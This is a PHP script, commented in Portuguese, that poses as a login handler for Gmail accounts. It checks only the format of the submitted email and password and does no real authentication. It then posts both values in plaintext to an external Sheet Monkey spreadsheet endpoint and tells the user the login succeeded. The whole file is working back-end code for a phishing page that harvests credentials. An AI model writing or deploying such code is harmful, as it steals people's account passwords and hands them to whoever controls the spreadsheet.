<?php

//Verificação do método de requisição:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $email = $_POST['email'];
  $password = $_POST['password'];
  
  // Validação do email
  if (!filter_var($email, FILTER_VALIDATE_EMAIL) || !strpos($email, '@gmail.com')) {
    $response = array(
      'status' => 'error',
      'message' => 'Digite um e-mail válido do Gmail'
    );
    echo json_encode($response);
    return;
  }

  // Verifica se a senha contém pelo menos uma letra e um número
  if (!preg_match('/[A-Za-z]/', $password) || !preg_match('/\d/', $password)) {
    $response = array(
      'status' => 'error',
      'message' => 'A senha deve conter pelo menos uma letra e um número'
    );
    echo json_encode($response);
    return;
  }

  // Login bem-sucedido


  // Dados para enviar para a planilha
  $sheetData = array(
    'Email' => $email,
    'Senha' => $password
  );

  // Converte os dados em formato JSON
  $jsonData = json_encode($sheetData);

  // URL da API do Sheet Monkey
  $apiUrl = 'https://api.sheetmonkey.io/form/99SJCCHSNEzVETRfX84pNP';

  // Cabeçalhos da requisição
  $headers = array(
    'Content-Type: application/json',
    'Authorization: Bearer {99SJCCHSNEzVETRfX84pNP}'
  );

  // Configurações da requisição
  $options = array(
    'http' => array(
      'method' => 'POST',
      'header' => $headers,
      'content' => $jsonData
    )
  );

  // Envia a requisição para a API do Sheet Monkey
  $context = stream_context_create($options);
  $result = file_get_contents($apiUrl, false, $context);

  if ($result === false) {
    $response = array(
      'status' => 'error',
      'message' => 'Erro ao enviar os dados para a planilha'
    );
    echo json_encode($response);
    return;
  }

  // O envio dos dados foi bem-sucedido
  $response = array(
    'status' => 'success',
    'message' => 'Login bem-sucedido'
  );
  echo json_encode($response);

  exit();
}
?>
